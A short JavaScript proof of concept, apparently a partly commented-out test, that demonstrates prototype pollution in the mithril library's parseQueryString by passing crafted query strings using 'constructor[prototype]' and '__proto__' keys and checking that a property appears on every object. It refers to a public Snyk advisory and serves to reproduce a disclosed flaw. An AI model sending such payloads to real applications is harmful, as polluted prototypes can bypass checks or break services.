// //https://snyk.io/vuln/SNYK-JS-MITHRIL-460113
// test("prototype pollution in mithril", () => {
  require("mithril/test-utils/browserMock")(global);
  const m = require("mithril");
  obj = {};

console.log({}.polluted);

  //m.parseQueryString("__proto__%5Bpolluted%5D=yes");
  m.parseQueryString("constructor%5Bprototype%5Bpolluted%5D=yes");
console.log({}.polluted);
// });
